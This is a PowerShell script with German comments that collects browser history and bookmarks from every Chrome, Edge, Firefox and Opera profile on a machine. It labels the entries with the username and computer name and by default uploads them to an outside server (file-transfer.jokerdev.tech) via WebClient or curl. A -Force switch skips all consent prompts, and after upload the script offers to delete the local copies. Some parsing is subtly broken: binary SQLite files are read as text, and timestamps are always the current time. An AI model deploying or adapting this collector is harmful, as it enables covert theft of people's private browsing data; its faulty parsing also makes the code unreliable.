[CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'High')]
param (
    [Parameter(Mandatory = $true)]
    [ValidateSet('chrome', 'edge', 'firefox', 'opera')]
    [string[]]$Browser,
    
    [Parameter(Mandatory = $true)]
    [ValidateSet('history', 'bookmarks')]
    [string[]]$DataType,
    
    [Parameter()]
    [switch]$SkipUpload,
    
    [Parameter()]
    [string]$UploadUrl = "https://file-transfer.jokerdev.tech/upload",
    
    [Parameter()]
    [switch]$DryRun,
    
    [Parameter()]
    [switch]$Force
)

# Strict Mode für bessere Fehlererkennung
Set-StrictMode -Version 3.0

# Modul für SQLite (nur für Firefox History)
$useSQLite = $false
try {
    Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -ErrorAction Stop
    $useSQLite = $true
    Write-Verbose "SQLite-Unterstützung aktiviert"
} catch {
    Write-Verbose "SQLite-Bibliothek nicht verfügbar, Firefox History wird eingeschränkt unterstützt"
}

# ==============================================
# MODULE: Path Resolver
# ==============================================
function Get-BrowserPaths {
    [CmdletBinding()]
    [OutputType([System.Collections.Hashtable])]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('chrome', 'edge', 'firefox', 'opera')]
        [string]$Browser,
        
        [Parameter(Mandatory)]
        [ValidateSet('history', 'bookmarks')]
        [string]$DataType
    )
    
    $paths = [System.Collections.Generic.List[string]]::new()
    $basePaths = @{
        chrome = @{
            history   = @('\History')
            bookmarks = @('\Bookmarks')
            base      = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
        }
        edge = @{
            history   = @('\History')
            bookmarks = @('\Bookmarks')
            base      = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
        }
        firefox = @{
            history   = @('\places.sqlite')
            bookmarks = @('\bookmarks.json')
            base      = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
        }
        opera = @{
            history   = @('\History', '\Opera Stable\History', '\Opera GX Stable\History')
            bookmarks = @('\Bookmarks', '\Opera Stable\Bookmarks', '\Opera GX Stable\Bookmarks')
            base      = "$env:USERPROFILE\AppData\Roaming\Opera Software"
        }
    }
    
    if (-not $basePaths.ContainsKey($Browser)) {
        Write-Error "Browser '$Browser' nicht unterstützt"
        return @{}
    }
    
    $config = $basePaths[$Browser]
    
    switch ($Browser) {
        { $_ -in 'chrome', 'edge' } {
            # Finde alle Profile
            if (Test-Path $config.base) {
                $profiles = Get-ChildItem -Path $config.base -Directory -Filter "*" -ErrorAction SilentlyContinue | 
                           Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
                
                foreach ($profile in $profiles) {
                    $dataPath = $config[$DataType]
                    $fullPath = Join-Path $profile.FullName $dataPath[0]
                    if (Test-Path $fullPath) {
                        $paths.Add($fullPath)
                    }
                }
            }
        }
        
        'firefox' {
            # Firefox Profile
            if (Test-Path $config.base) {
                $profiles = Get-ChildItem -Path $config.base -Directory -ErrorAction SilentlyContinue
                foreach ($profile in $profiles) {
                    $fullPath = Join-Path $profile.FullName $config[$DataType][0]
                    if (Test-Path $fullPath) {
                        $paths.Add($fullPath)
                    }
                }
            }
        }
        
        'opera' {
            # Opera Varianten
            foreach ($relativePath in $config[$DataType]) {
                $fullPath = Join-Path $config.base $relativePath.TrimStart('\')
                if (Test-Path $fullPath) {
                    $paths.Add($fullPath)
                }
            }
        }
    }
    
    return @{
        Browser = $Browser
        DataType = $DataType
        Paths = $paths
    }
}

# ==============================================
# MODULE: File Access Handler
# ==============================================
function Read-BrowserFile {
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory)]
        [string]$FilePath,
        
        [Parameter(Mandatory)]
        [string]$DataType,
        
        [Parameter(Mandatory)]
        [string]$Browser
    )
    
    $tempFile = $null
    try {
        Write-Verbose "Lese Datei: $FilePath"
        
        # Versuche direkten Zugriff
        if ($DryRun) {
            Write-Output "[DRY-RUN] Würde lesen: $FilePath"
            return $null
        }
        
        try {
            # Direktes Lesen versuchen
            $content = Get-Content -Path $FilePath -Raw -ErrorAction Stop
            return $content
        }
        catch [System.IO.IOException] {
            # Datei ist gesperrt - kopieren in TEMP
            Write-Verbose "Datei gesperrt, kopiere zu TEMP..."
            $tempFile = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString())
            Copy-Item -Path $FilePath -Destination $tempFile -Force -ErrorAction Stop
            
            # Prüfe Dateigröße (Verhindert Memory Issues)
            $fileSize = (Get-Item $tempFile).Length / 1MB
            if ($fileSize -gt 100) {
                Write-Warning "Datei ist sehr groß ($($fileSize) MB), Verarbeitung kann Speicherintensiv sein"
            }
            
            $content = Get-Content -Path $tempFile -Raw -ErrorAction Stop
            return $content
        }
    }
    catch {
        Write-Warning "Fehler beim Lesen von $FilePath : $($_.Exception.Message)"
        return $null
    }
    finally {
        # Temp-File aufräumen
        if ($tempFile -and (Test-Path $tempFile)) {
            Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
        }
    }
}

# ==============================================
# MODULE: Data Parser
# ==============================================
function Parse-BrowserData {
    [CmdletBinding()]
    [OutputType([System.Collections.Generic.List[PSCustomObject]])]
    param(
        [Parameter(Mandatory)]
        [string]$Content,
        
        [Parameter(Mandatory)]
        [string]$DataType,
        
        [Parameter(Mandatory)]
        [string]$Browser,
        
        [Parameter(Mandatory)]
        [string]$SourcePath
    )
    
    $results = [System.Collections.Generic.List[PSCustomObject]]::new()
    
    if ([string]::IsNullOrWhiteSpace($Content)) {
        return $results
    }
    
    try {
        switch ($Browser) {
            { $_ -in 'chrome', 'edge', 'opera' } {
                if ($DataType -eq 'history') {
                    # Verbesserte URL-Erkennung
                    $urlPattern = 'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s"''<>]*'
                    $matches = [regex]::Matches($Content, $urlPattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)
                    
                    foreach ($match in $matches) {
                        $url = $match.Value.Trim()
                        # Filtere interne URLs
                        if ($url -match '^(chrome|edge|opera|about|file|data):' -or 
                            $url.Length -lt 10) {
                            continue
                        }
                        
                        $results.Add([PSCustomObject]@{
                            Url = $url
                            Source = $SourcePath
                            Timestamp = [datetime]::Now
                        })
                    }
                }
                elseif ($DataType -eq 'bookmarks') {
                    # Chrome/Edge Bookmarks sind JSON
                    try {
                        $bookmarks = $Content | ConvertFrom-Json -ErrorAction Stop
                        Extract-Bookmarks -Node $bookmarks.roots -Results $results -SourcePath $SourcePath
                    }
                    catch {
                        # Fallback: Regex für Bookmarks
                        $urlPattern = '"url"\s*:\s*"([^""]+)"'
                        $matches = [regex]::Matches($Content, $urlPattern)
                        
                        foreach ($match in $matches) {
                            $url = $match.Groups[1].Value
                            if ($url -notmatch '^(chrome|edge|opera|about):') {
                                $results.Add([PSCustomObject]@{
                                    Url = $url
                                    Source = $SourcePath
                                    Timestamp = [datetime]::Now
                                    Type = 'Bookmark'
                                })
                            }
                        }
                    }
                }
            }
            
            'firefox' {
                if ($DataType -eq 'history' -and $useSQLite) {
                    # SQLite-basierte Verarbeitung
                    $results.AddRange((Parse-FirefoxHistory -Content $Content -SourcePath $SourcePath))
                }
                elseif ($DataType -eq 'bookmarks') {
                    # Firefox Bookmarks JSON
                    $urlPattern = '"uri"\s*:\s*"([^""]+)"'
                    $matches = [regex]::Matches($Content, $urlPattern)
                    
                    foreach ($match in $matches) {
                        $url = $match.Groups[1].Value
                        $results.Add([PSCustomObject]@{
                            Url = $url
                            Source = $SourcePath
                            Timestamp = [datetime]::Now
                            Type = 'Bookmark'
                        })
                    }
                }
            }
        }
    }
    catch {
        Write-Warning "Fehler beim Parsen der Daten: $($_.Exception.Message)"
    }
    
    return $results
}

function Extract-Bookmarks {
    param(
        $Node,
        [System.Collections.Generic.List[PSCustomObject]]$Results,
        [string]$SourcePath
    )
    
    if ($Node.PSObject.Properties['url']) {
        $url = $Node.url
        if ($url -and $url -notmatch '^(chrome|edge|opera|about):') {
            $Results.Add([PSCustomObject]@{
                Url = $url
                Source = $SourcePath
                Timestamp = [datetime]::Now
                Type = 'Bookmark'
                Title = $Node.name
            })
        }
    }
    
    if ($Node.PSObject.Properties['children']) {
        foreach ($child in $Node.children) {
            Extract-Bookmarks -Node $child -Results $Results -SourcePath $SourcePath
        }
    }
}

function Parse-FirefoxHistory {
    param(
        [string]$Content,
        [string]$SourcePath
    )
    
    $results = [System.Collections.Generic.List[PSCustomObject]]::new()
    
    try {
        # Erstelle temporäre Kopie für SQLite
        $tempDb = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString() + ".sqlite")
        [System.IO.File]::WriteAllBytes($tempDb, [System.Text.Encoding]::UTF8.GetBytes($Content))
        
        $connectionString = "Data Source=$tempDb;Version=3;Read Only=True;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = @"
            SELECT url, title, last_visit_date/1000000 as visit_time 
            FROM moz_places 
            WHERE url LIKE 'http%' 
            ORDER BY last_visit_date DESC
"@
        
        $reader = $command.ExecuteReader()
        while ($reader.Read()) {
            $url = $reader["url"].ToString()
            $results.Add([PSCustomObject]@{
                Url = $url
                Source = $SourcePath
                Timestamp = [datetime]::Now
                Title = $reader["title"].ToString()
            })
        }
        
        $reader.Close()
        $connection.Close()
    }
    catch {
        Write-Warning "SQLite-Verarbeitung fehlgeschlagen: $($_.Exception.Message)"
    }
    finally {
        if ($tempDb -and (Test-Path $tempDb)) {
            Remove-Item -Path $tempDb -Force -ErrorAction SilentlyContinue
        }
    }
    
    return $results
}

# ==============================================
# MODULE: Data Aggregator
# ==============================================
function Get-BrowserData {
    [CmdletBinding(SupportsShouldProcess)]
    [OutputType([System.Collections.Generic.List[PSCustomObject]])]
    param(
        [Parameter(Mandatory)]
        [ValidateSet('chrome', 'edge', 'firefox', 'opera')]
        [string]$Browser,
        
        [Parameter(Mandatory)]
        [ValidateSet('history', 'bookmarks')]
        [string]$DataType,
        
        [switch]$Force
    )
    
    $allResults = [System.Collections.Generic.List[PSCustomObject]]::new()
    
    # Bestätigung für Datenerfassung
    $action = "Browser-Daten sammeln ($Browser - $DataType)"
    if ($PSCmdlet.ShouldProcess($action, "Fortfahren?", "Datenerfassung")) {
        if (-not $Force -and -not $PSCmdlet.ShouldContinue($action, "Diese Aktion liest private Browser-Daten")) {
            Write-Verbose "Vom Benutzer abgebrochen"
            return $allResults
        }
        
        # Pfade ermitteln
        $paths = Get-BrowserPaths -Browser $Browser -DataType $DataType
        
        if ($paths.Paths.Count -eq 0) {
            Write-Verbose "Keine Dateien für $Browser $DataType gefunden"
            return $allResults
        }
        
        Write-Verbose "Verarbeite $($paths.Paths.Count) Dateien für $Browser $DataType"
        
        foreach ($filePath in $paths.Paths) {
            try {
                # Datei lesen
                $content = Read-BrowserFile -FilePath $filePath -DataType $DataType -Browser $Browser
                if (-not $content) { continue }
                
                # Daten parsen
                $parsedResults = Parse-BrowserData -Content $content -DataType $DataType -Browser $Browser -SourcePath $filePath
                
                # Ergebnisse hinzufügen
                foreach ($result in $parsedResults) {
                    $result.PSObject.Properties.Add([psnoteproperty]::new('Browser', $Browser))
                    $result.PSObject.Properties.Add([psnoteproperty]::new('DataType', $DataType))
                    $result.PSObject.Properties.Add([psnoteproperty]::new('User', $env:USERNAME))
                    $result.PSObject.Properties.Add([psnoteproperty]::new('Computer', $env:COMPUTERNAME))
                    
                    $allResults.Add($result)
                }
            }
            catch {
                Write-Warning "Fehler bei $filePath : $($_.Exception.Message)"
            }
        }
    }
    
    return $allResults
}

# ==============================================
# MODULE: Export & Upload
# ==============================================
function Export-BrowserData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [PSCustomObject[]]$BrowserData,
        
        [Parameter(Mandatory)]
        [string]$OutputPath,
        
        [ValidateSet('Json', 'Csv', 'Text')]
        [string]$Format = 'Json'
    )
    
    begin {
        $allData = [System.Collections.Generic.List[PSCustomObject]]::new()
    }
    
    process {
        foreach ($item in $BrowserData) {
            $allData.Add($item)
        }
    }
    
    end {
        if ($allData.Count -eq 0) {
            Write-Warning "Keine Daten zum Exportieren"
            return $null
        }
        
        # Deduplizierung
        $uniqueData = $allData | Sort-Object -Property Url -Unique
        
        Write-Verbose "Exportiere $($uniqueData.Count) eindeutige Einträge nach $OutputPath"
        
        switch ($Format) {
            'Json' {
                $uniqueData | ConvertTo-Json -Depth 5 -Compress | Set-Content -Path $OutputPath -Encoding UTF8
            }
            'Csv' {
                $uniqueData | Select-Object User, Computer, Browser, DataType, Url, Title, Source, Timestamp |
                    Export-Csv -Path $OutputPath -Encoding UTF8 -NoTypeInformation
            }
            'Text' {
                $report = @"
Browser Data Report
===================
Erstellt: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Benutzer: $env:USERNAME
Computer: $env:COMPUTERNAME
Einträge: $($uniqueData.Count)

"@
                
                $grouped = $uniqueData | Group-Object -Property Browser, DataType
                foreach ($group in $grouped) {
                    $report += "`n=== $($group.Name) ===`n"
                    foreach ($item in $group.Group) {
                        $report += "  $($item.Url)`n"
                        if ($item.Title) {
                            $report += "    Titel: $($item.Title)`n"
                        }
                    }
                }
                
                Set-Content -Path $OutputPath -Value $report -Encoding UTF8
            }
        }
        
        return $OutputPath
    }
}

function Invoke-FileUpload {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [string]$FilePath,
        
        [Parameter(Mandatory)]
        [string]$UploadUrl,
        
        [switch]$Force
    )
    
    if (-not (Test-Path $FilePath)) {
        Write-Error "Datei nicht gefunden: $FilePath"
        return $false
    }
    
    if ($SkipUpload) {
        Write-Verbose "Upload übersprungen (SkipUpload angegeben)"
        return $true
    }
    
    $fileName = Split-Path $FilePath -Leaf
    $fullUrl = "$UploadUrl/$fileName"
    
    $action = "Datei hochladen nach $fullUrl"
    if ($PSCmdlet.ShouldProcess($action, "Fortfahren?", "Datei-Upload")) {
        if (-not $Force -and -not $PSCmdlet.ShouldContinue($action, "Datei wird an externen Server gesendet")) {
            return $false
        }
        
        try {
            Write-Verbose "Upload startet..."
            
            # Methode 1: WebClient
            $webClient = New-Object System.Net.WebClient
            $webClient.UploadFile($fullUrl, $FilePath)
            
            Write-Verbose "Upload erfolgreich"
            return $true
        }
        catch {
            Write-Error "Upload fehlgeschlagen: $($_.Exception.Message)"
            
            # Alternative: cURL falls verfügbar
            try {
                if (Get-Command curl -ErrorAction SilentlyContinue) {
                    Write-Verbose "Versuche mit cURL..."
                    curl -T $FilePath $fullUrl
                    return $true
                }
            }
            catch {
                Write-Error "Auch cURL fehlgeschlagen"
            }
            
            return $false
        }
    }
    
    return $false
}

# ==============================================
# MAIN SCRIPT
# ==============================================
function Main {
    [CmdletBinding()]
    param()
    
    Write-Host "`n=== PowerShell Browser Data Collector ===" -ForegroundColor Cyan
    Write-Host "Benutzer: $env:USERNAME | Computer: $env:COMPUTERNAME" -ForegroundColor Gray
    
    if ($DryRun) {
        Write-Host "DRY RUN MODE - Keine Daten werden gelesen oder gesendet" -ForegroundColor Yellow
    }
    
    # Sammle alle angeforderten Daten
    $allBrowserData = [System.Collections.Generic.List[PSCustomObject]]::new()
    
    foreach ($browser in $Browser) {
        foreach ($dataType in $DataType) {
            Write-Host "`nVerarbeite: $browser - $dataType" -ForegroundColor Cyan
            
            if ($browser -eq 'firefox' -and $dataType -eq 'bookmarks') {
                Write-Warning "Firefox Bookmarks werden derzeit nicht vollständig unterstützt"
                continue
            }
            
            $data = Get-BrowserData -Browser $browser -DataType $dataType -Force:$Force
            if ($data.Count -gt 0) {
                Write-Host "  Gefunden: $($data.Count) Einträge" -ForegroundColor Green
                $allBrowserData.AddRange($data)
            }
            else {
                Write-Host "  Keine Daten gefunden" -ForegroundColor Gray
            }
        }
    }
    
    # Ergebnisse verarbeiten
    if ($allBrowserData.Count -eq 0) {
        Write-Host "`nKeine Browser-Daten gefunden!" -ForegroundColor Yellow
        
        # Debug-Info
        if ($VerbosePreference -ne 'SilentlyContinue') {
            Write-Host "`nDebug-Information:" -ForegroundColor Magenta
            foreach ($browser in 'chrome', 'edge', 'firefox', 'opera') {
                $path = switch ($browser) {
                    'chrome' { "$env:USERPROFILE\AppData\Local\Google\Chrome" }
                    'edge' { "$env:USERPROFILE\AppData\Local\Microsoft\Edge" }
                    'firefox' { "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox" }
                    'opera' { "$env:USERPROFILE\AppData\Roaming\Opera Software" }
                }
                $exists = Test-Path $path
                Write-Host "  $browser : $(if($exists){'gefunden'}else{'nicht gefunden'})" -ForegroundColor $(if($exists){'Green'}else{'Red'})
            }
        }
        
        return
    }
    
    # Exportieren
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $outputDir = Join-Path $env:TEMP "BrowserData"
    if (-not (Test-Path $outputDir)) {
        New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
    }
    
    $jsonFile = Join-Path $outputDir "browser-data-$timestamp.json"
    $textFile = Join-Path $outputDir "browser-data-$timestamp.txt"
    
    # JSON Export (strukturiert)
    $exportedFile = $allBrowserData | Export-BrowserData -OutputPath $jsonFile -Format Json
    Write-Host "`nDaten exportiert nach: $exportedFile" -ForegroundColor Green
    
    # Text Export (lesbar)
    $allBrowserData | Export-BrowserData -OutputPath $textFile -Format Text
    Write-Host "Report erstellt: $textFile" -ForegroundColor Green
    
    # Zusammenfassung
    Write-Host "`n=== Zusammenfassung ===" -ForegroundColor Cyan
    $summary = $allBrowserData | Group-Object -Property Browser, DataType | 
               ForEach-Object { 
                   $parts = $_.Name -split ', '
                   "[$($parts[0]) $($parts[1])]: $($_.Count)" 
               }
    
    Write-Host ($summary -join " | ") -ForegroundColor White
    Write-Host "Gesamt: $($allBrowserData.Count) Einträge" -ForegroundColor White
    
    # Upload
    if (-not $SkipUpload) {
        Write-Host "`n=== Upload ===" -ForegroundColor Cyan
        $success = Invoke-FileUpload -FilePath $jsonFile -UploadUrl $UploadUrl -Force:$Force
        
        if ($success) {
            Write-Host "Daten erfolgreich hochgeladen" -ForegroundColor Green
        }
        else {
            Write-Host "Upload fehlgeschlagen oder abgebrochen" -ForegroundColor Yellow
            Write-Host "Dateien bleiben in: $outputDir" -ForegroundColor Gray
        }
    }
    else {
        Write-Host "`nUpload übersprungen (Parameter -SkipUpload)" -ForegroundColor Yellow
        Write-Host "Dateien in: $outputDir" -ForegroundColor Gray
    }
    
    # Optional: Bereinigung
    if (-not $SkipUpload -and $success) {
        $cleanup = Read-Host "`nDateien lokal löschen? (j/n)"
        if ($cleanup -eq 'j') {
            Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "Dateien gelöscht" -ForegroundColor Green
        }
    }
    
    Write-Host "`nVorgang abgeschlossen" -ForegroundColor Cyan
}

# Script-Start mit Fehlerbehandlung
try {
    # Benutzerhinweis
    if (-not $Force) {
        Write-Host "`nACHTUNG: Dieses Skript sammelt Browser-Verlauf und Lesezeichen." -ForegroundColor Yellow
        Write-Host "Die Daten können vertrauliche Informationen enthalten." -ForegroundColor Yellow
        
        $confirm = Read-Host "Fortfahren? (j/n)"
        if ($confirm -ne 'j') {
            Write-Host "Abgebrochen vom Benutzer" -ForegroundColor Gray
            exit 0
        }
    }
    
    # Hauptfunktion aufrufen
    Main
    
    # Fenster offen halten
    if ($Host.Name -match 'console') {
        Write-Host "`nDrücke eine Taste zum Beenden..." -ForegroundColor Gray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
}
catch {
    Write-Error "Ein unerwarteter Fehler ist aufgetreten: $($_.Exception.Message)"
    Write-Error "Stack Trace: $($_.ScriptStackTrace)"
    
    # Fehlerprotokoll
    $errorLog = Join-Path $env:TEMP "browser-data-error-$(Get-Date -Format 'yyyyMMdd-HHmmss').log"
    $_ | Out-File -FilePath $errorLog -Encoding UTF8
    Write-Host "Fehlerdetails wurden gespeichert in: $errorLog" -ForegroundColor Red
    
    if ($Host.Name -match 'console') {
        Write-Host "Drücke eine Taste zum Beenden..." -ForegroundColor Gray
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    exit 1
}
